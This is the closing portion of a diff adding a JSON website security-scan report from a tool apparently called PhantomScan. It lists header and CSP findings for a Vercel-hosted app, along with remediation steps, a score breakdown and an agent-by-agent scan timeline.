+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 300,
+            "label": "Finding #300",
+            "title": "Could not establish TLS connection",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 301,
+            "label": "Finding #301",
+            "title": "Server version disclosure",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          },
+          {
+            "type": "finding",
+            "id": 302,
+            "label": "Finding #302",
+            "title": "API response permits reads from any origin",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Related finding"
+          }
+        ],
+        "explanation": "These observations share an endpoint, category/module, or CVE context. PhantomScan does not label this an exploit chain without direct proof."
+      }
+    ],
+    "root_causes": [
+      {
+        "name": "Browser Security Policy",
+        "finding_count": 2,
+        "highest_severity": "HIGH",
+        "finding_ids": [
+          298,
+          299
+        ],
+        "summary": "2 related findings appear to share this root area."
+      },
+      {
+        "name": "Application Security",
+        "finding_count": 3,
+        "highest_severity": "MEDIUM",
+        "finding_ids": [
+          300,
+          302,
+          303
+        ],
+        "summary": "3 related findings appear to share this root area."
+      },
+      {
+        "name": "Dependency and CVE",
+        "finding_count": 1,
+        "highest_severity": "LOW",
+        "finding_ids": [
+          301
+        ],
+        "summary": "1 related finding appear to share this root area."
+      },
+      {
+        "name": "Access Control",
+        "finding_count": 1,
+        "highest_severity": "LOW",
+        "finding_ids": [
+          304
+        ],
+        "summary": "1 related finding appear to share this root area."
+      }
+    ],
+    "remediation_plan": {
+      "IMMEDIATE": [
+        {
+          "priority": 1,
+          "finding_id": 298,
+          "title": "CSP allows unsafe-inline scripts",
+          "action": "Remove 'unsafe-inline' from script-src; use nonces or hashes",
+          "citation": {
+            "type": "finding",
+            "id": 298,
+            "label": "Finding #298",
+            "title": "CSP allows unsafe-inline scripts",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Finding"
+          }
+        },
+        {
+          "priority": 2,
+          "finding_id": 303,
+          "title": "Content Security Policy permits unsafe script execution",
+          "action": "Remove unsafe-eval and migrate inline scripts to nonces or hashes with narrowly scoped sources.",
+          "citation": {
+            "type": "finding",
+            "id": 303,
+            "label": "Finding #303",
+            "title": "Content Security Policy permits unsafe script execution",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Finding"
+          }
+        }
+      ],
+      "TODAY": [],
+      "THIS_WEEK": [
+        {
+          "priority": 3,
+          "finding_id": 300,
+          "title": "Could not establish TLS connection",
+          "action": "Ensure HTTPS is properly configured",
+          "citation": {
+            "type": "finding",
+            "id": 300,
+            "label": "Finding #300",
+            "title": "Could not establish TLS connection",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Finding"
+          }
+        },
+        {
+          "priority": 4,
+          "finding_id": 299,
+          "title": "Missing Permissions-Policy",
+          "action": "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()",
+          "citation": {
+            "type": "finding",
+            "id": 299,
+            "label": "Finding #299",
+            "title": "Missing Permissions-Policy",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Finding"
+          }
+        },
+        {
+          "priority": 5,
+          "finding_id": 301,
+          "title": "Server version disclosure",
+          "action": "Remove or obfuscate the 'server' header in server config",
+          "citation": {
+            "type": "finding",
+            "id": 301,
+            "label": "Finding #301",
+            "title": "Server version disclosure",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Finding"
+          }
+        },
+        {
+          "priority": 6,
+          "finding_id": 302,
+          "title": "API response permits reads from any origin",
+          "action": "Allow only required trusted origins and enable credentials only for endpoints that need them.",
+          "citation": {
+            "type": "finding",
+            "id": 302,
+            "label": "Finding #302",
+            "title": "API response permits reads from any origin",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Finding"
+          }
+        },
+        {
+          "priority": 7,
+          "finding_id": 304,
+          "title": "Non-production or administrative hostnames discovered",
+          "action": "Inventory each hostname, retire unused systems, and apply production-equivalent access controls and patching.",
+          "citation": {
+            "type": "finding",
+            "id": 304,
+            "label": "Finding #304",
+            "title": "Non-production or administrative hostnames discovered",
+            "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+            "source": "Finding"
+          }
+        }
+      ]
+    },
+    "score_explanation": {
+      "score": 70,
+      "deductions": [
+        {
+          "label": "1 High severity finding",
+          "points": -14
+        },
+        {
+          "label": "2 Medium severity findings",
+          "points": -14
+        },
+        {
+          "label": "4 Low severity findings",
+          "points": -8
+        }
+      ],
+      "credits": [
+        {
+          "label": "3 positive security controls",
+          "points": 6
+        }
+      ]
+    },
+    "positive_controls": [
+      {
+        "title": "Secure cookies detected",
+        "evidence": "Observed cookies include Secure, HttpOnly, and SameSite metadata."
+      },
+      {
+        "title": "HSTS enabled",
+        "evidence": "Browser network evidence includes Strict-Transport-Security."
+      },
+      {
+        "title": "No high-risk CVEs detected",
+        "evidence": "Persisted findings contain no high or critical CVE result."
+      }
+    ],
+    "scan_comparison": {
+      "previous_scan_id": null,
+      "new_findings": [
+        "API response permits reads from any origin",
+        "CSP allows unsafe-inline scripts",
+        "Content Security Policy permits unsafe script execution",
+        "Could not establish TLS connection",
+        "Missing Permissions-Policy",
+        "Non-production or administrative hostnames discovered",
+        "Server version disclosure"
+      ],
+      "resolved_findings": [],
+      "worsened_findings": [],
+      "new_routes": [
+        "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/"
+      ],
+      "new_apis": [],
+      "new_technologies": [],
+      "new_third_parties": [],
+      "new_authentication_surfaces": [],
+      "removed_exposure": []
+    },
+    "security_timeline": [
+      {
+        "timestamp": "2026-07-29 14:25:04",
+        "title": "scan created",
+        "detail": "Created defend scan for https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/ with high intensity and modules: none",
+        "source": "System"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:04",
+        "title": "started",
+        "detail": "Orchestrating defend scan for https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Orchestrator Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:04",
+        "title": "started",
+        "detail": "Scanning https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Scanner Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:15",
+        "title": "completed",
+        "detail": "Completed pure analysis with 0 findings",
+        "source": "Access Control Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:15",
+        "title": "completed",
+        "detail": "Completed pure analysis with 0 findings",
+        "source": "Authentication Security Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:15",
+        "title": "completed",
+        "detail": "Completed pure analysis with 1 findings",
+        "source": "API Security Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:15",
+        "title": "completed",
+        "detail": "Completed pure analysis with 1 findings",
+        "source": "Threat Intelligence Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:15",
+        "title": "browser observation started",
+        "detail": "Starting browser observation for https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Browser Security Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "completed",
+        "detail": "Completed pure analysis with 0 findings",
+        "source": "Injection Analysis Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "completed",
+        "detail": "Completed pure analysis with 1 findings",
+        "source": "Infrastructure Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "skipped",
+        "detail": "NVD_API_KEY not configured",
+        "source": "CVE Matcher Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "browser observation completed",
+        "detail": "Browser observation completed with 1 network events, 0 APIs, and 1 findings",
+        "source": "Browser Security Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "completed",
+        "detail": "Completed pure analysis with 0 findings",
+        "source": "Session Security Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "completed",
+        "detail": "Generated 4 findings",
+        "source": "Analyzer Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "completed",
+        "detail": "Completed pure analysis with 0 findings",
+        "source": "Dependency Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "completed",
+        "detail": "Completed pure analysis with 0 findings",
+        "source": "WebSocket Security Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "started",
+        "detail": "Enriching 8 findings with AI",
+        "source": "AI Explainer Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:16",
+        "title": "started",
+        "detail": "Creating Hindi explanations for 8 findings",
+        "source": "Hindi Explainer Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:35",
+        "title": "completed",
+        "detail": "Enriched 1 critical/high findings",
+        "source": "AI Explainer Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:43",
+        "title": "completed",
+        "detail": "Hindi explanation added to 0 findings",
+        "source": "Hindi Explainer Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:43",
+        "title": "finding skipped",
+        "detail": "1 validation error for FindingCreate\ntimestamp\n  Input should be a valid datetime or date, unexpected extra characters at the end of the input [type=datetime_from_date_parsing, input_value='2026-07-29T14:25:16.5_*1530+00:00', input_type=str]\n    For further information visit https://errors.pydantic.dev/2.13/v/datetime_from_date_parsing",
+        "source": "Orchestrator Agent"
+      },
+      {
+        "timestamp": "2026-07-29 14:25:43",
+        "title": "started",
+        "detail": "Generating remediation checklist for 7 findings",
+        "source": "Fixer Agent"
+      },
+      {
+        "timestamp": "2026-07-29T14:25:15.598969Z",
+        "title": "LOW finding detected",
+        "detail": "API response permits reads from any origin",
+        "source": "Finding",
+        "finding_id": 302
+      },
+      {
+        "timestamp": "2026-07-29T14:25:15.614020Z",
+        "title": "LOW finding detected",
+        "detail": "Non-production or administrative hostnames discovered",
+        "source": "Finding",
+        "finding_id": 304
+      },
+      {
+        "timestamp": "2026-07-29T14:25:15.632601Z",
+        "title": "MEDIUM finding detected",
+        "detail": "Content Security Policy permits unsafe script execution",
+        "source": "Finding",
+        "finding_id": 303
+      },
+      {
+        "timestamp": "2026-07-29T14:25:43.571938Z",
+        "title": "HIGH finding detected",
+        "detail": "CSP allows unsafe-inline scripts",
+        "source": "Finding",
+        "finding_id": 298
+      },
+      {
+        "timestamp": "2026-07-29T14:25:43.583962Z",
+        "title": "LOW finding detected",
+        "detail": "Missing Permissions-Policy",
+        "source": "Finding",
+        "finding_id": 299
+      },
+      {
+        "timestamp": "2026-07-29T14:25:43.622533Z",
+        "title": "MEDIUM finding detected",
+        "detail": "Could not establish TLS connection",
+        "source": "Finding",
+        "finding_id": 300
+      },
+      {
+        "timestamp": "2026-07-29T14:25:43.634061Z",
+        "title": "LOW finding detected",
+        "detail": "Server version disclosure",
+        "source": "Finding",
+        "finding_id": 301
+      }
+    ],
+    "executive_report": {
+      "Overall Posture": "Moderate Risk",
+      "Major Risks": [
+        "CSP allows unsafe-inline scripts",
+        "Content Security Policy permits unsafe script execution",
+        "Could not establish TLS connection"
+      ],
+      "Improvements": [],
+      "New Exposure": [
+        "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/"
+      ],
+      "Recommended Priorities": [
+        "Remove 'unsafe-inline' from script-src; use nonces or hashes",
+        "Remove unsafe-eval and migrate inline scripts to nonces or hashes with narrowly scoped sources.",
+        "Ensure HTTPS is properly configured"
+      ],
+      "Verification Status": "2 priority items need immediate attention.",
+      "What's Already Secure": [
+        "Secure cookies detected",
+        "HSTS enabled",
+        "No high-risk CVEs detected"
+      ]
+    },
+    "developer_report": [
+      {
+        "finding_id": 298,
+        "affected_endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "evidence": "script-src includes 'unsafe-inline'",
+        "observed_behavior": "script-src includes 'unsafe-inline'",
+        "severity": "HIGH",
+        "confidence": "MEDIUM",
+        "related_findings": [
+          "Related Security Chain: CSP allows unsafe-inline scripts"
+        ],
+        "technology": "derived from scan artifacts when available",
+        "remediation": "Remove 'unsafe-inline' from script-src; use nonces or hashes",
+        "verification": "Rerun the relevant PhantomScan analysis after remediation and confirm the evidence is absent.",
+        "recommended_priority": 1
+      },
+      {
+        "finding_id": 299,
+        "affected_endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "evidence": "No Permissions-Policy header",
+        "observed_behavior": "No Permissions-Policy header",
+        "severity": "LOW",
+        "confidence": "MEDIUM",
+        "related_findings": [
+          "Related Security Chain: Missing Permissions-Policy"
+        ],
+        "technology": "derived from scan artifacts when available",
+        "remediation": "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()",
+        "verification": "Rerun the relevant PhantomScan analysis after remediation and confirm the evidence is absent.",
+        "recommended_priority": 4
+      },
+      {
+        "finding_id": 300,
+        "affected_endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "evidence": "Failed to connect to nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app:443",
+        "observed_behavior": "Failed to connect to nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app:443",
+        "severity": "MEDIUM",
+        "confidence": "MEDIUM",
+        "related_findings": [
+          "Related Security Chain: Could not establish TLS connection"
+        ],
+        "technology": "derived from scan artifacts when available",
+        "remediation": "Ensure HTTPS is properly configured",
+        "verification": "Rerun the relevant PhantomScan analysis after remediation and confirm the evidence is absent.",
+        "recommended_priority": 3
+      },
+      {
+        "finding_id": 301,
+        "affected_endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "evidence": "Header 'server: Vercel'",
+        "observed_behavior": "Header 'server: Vercel'",
+        "severity": "LOW",
+        "confidence": "MEDIUM",
+        "related_findings": [
+          "Related Security Chain: Server version disclosure"
+        ],
+        "technology": "derived from scan artifacts when available",
+        "remediation": "Remove or obfuscate the 'server' header in server config",
+        "verification": "Rerun the relevant PhantomScan analysis after remediation and confirm the evidence is absent.",
+        "recommended_priority": 5
+      },
+      {
+        "finding_id": 302,
+        "affected_endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "evidence": "Captured response sets Access-Control-Allow-Origin: *.",
+        "observed_behavior": "Captured response sets Access-Control-Allow-Origin: *.",
+        "severity": "LOW",
+        "confidence": "MEDIUM",
+        "related_findings": [
+          "Related Security Chain: API response permits reads from any origin"
+        ],
+        "technology": "derived from scan artifacts when available",
+        "remediation": "Allow only required trusted origins and enable credentials only for endpoints that need them.",
+        "verification": "Send approved requests from trusted and untrusted origins and confirm only trusted origins receive an allow-origin response.",
+        "recommended_priority": 6
+      },
+      {
+        "finding_id": 303,
+        "affected_endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "evidence": "The captured CSP script policy includes unsafe-inline or unsafe-eval; nonce and hash values are omitted from evidence.",
+        "observed_behavior": "The captured CSP script policy includes unsafe-inline or unsafe-eval; nonce and hash values are omitted from evidence.",
+        "severity": "MEDIUM",
+        "confidence": "HIGH",
+        "related_findings": [
+          "Related Security Chain: Content Security Policy permits unsafe script execution"
+        ],
+        "technology": "derived from scan artifacts when available",
+        "remediation": "Remove unsafe-eval and migrate inline scripts to nonces or hashes with narrowly scoped sources.",
+        "verification": "Capture the policy after deployment and confirm scripts work without unsafe-eval or broad unsafe-inline allowances.",
+        "recommended_priority": 2
+      },
+      {
+        "finding_id": 304,
+        "affected_endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "evidence": "Supplied reconnaissance includes sensitive-looking hostname(s): admin.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, beta.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, dev.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, internal.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, old.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, staging.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, test.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app.",
+        "observed_behavior": "Supplied reconnaissance includes sensitive-looking hostname(s): admin.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, beta.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, dev.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, internal.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, old.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, staging.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app, test.nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app.",
+        "severity": "LOW",
+        "confidence": "POTENTIAL",
+        "related_findings": [
+          "Related Security Chain: Non-production or administrative hostnames discovered"
+        ],
+        "technology": "derived from scan artifacts when available",
+        "remediation": "Inventory each hostname, retire unused systems, and apply production-equivalent access controls and patching.",
+        "verification": "Confirm ownership, purpose, and access policy for every listed hostname.",
+        "recommended_priority": 7
+      }
+    ],
+    "suggested_prompts": [
+      "What should I fix first?",
+      "Why is my security score this value?",
+      "Which findings affect authentication?",
+      "Which APIs are highest priority?",
+      "What changed since my previous scan?",
+      "Which findings are confirmed?",
+      "Explain this issue in Hindi.",
+      "Give me a remediation checklist.",
+      "Which issues were resolved?",
+      "Which attack surfaces are new?"
+    ],
+    "citations": [
+      {
+        "type": "finding",
+        "id": 298,
+        "label": "Finding #298",
+        "title": "CSP allows unsafe-inline scripts",
+        "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Finding"
+      },
+      {
+        "type": "finding",
+        "id": 303,
+        "label": "Finding #303",
+        "title": "Content Security Policy permits unsafe script execution",
+        "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Finding"
+      },
+      {
+        "type": "finding",
+        "id": 300,
+        "label": "Finding #300",
+        "title": "Could not establish TLS connection",
+        "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Finding"
+      },
+      {
+        "type": "finding",
+        "id": 299,
+        "label": "Finding #299",
+        "title": "Missing Permissions-Policy",
+        "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Finding"
+      },
+      {
+        "type": "finding",
+        "id": 301,
+        "label": "Finding #301",
+        "title": "Server version disclosure",
+        "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Finding"
+      },
+      {
+        "type": "finding",
+        "id": 302,
+        "label": "Finding #302",
+        "title": "API response permits reads from any origin",
+        "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Finding"
+      },
+      {
+        "type": "finding",
+        "id": 304,
+        "label": "Finding #304",
+        "title": "Non-production or administrative hostnames discovered",
+        "endpoint": "https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/",
+        "source": "Finding"
+      }
+    ],
+    "grounding": {
+      "source": "scanner-generated evidence only",
+      "evidence_hash": "14dee8675d283ea50f37566658809542d8b9541aae1785dfed8f097be06ca9be"
+    }
+  }
+}
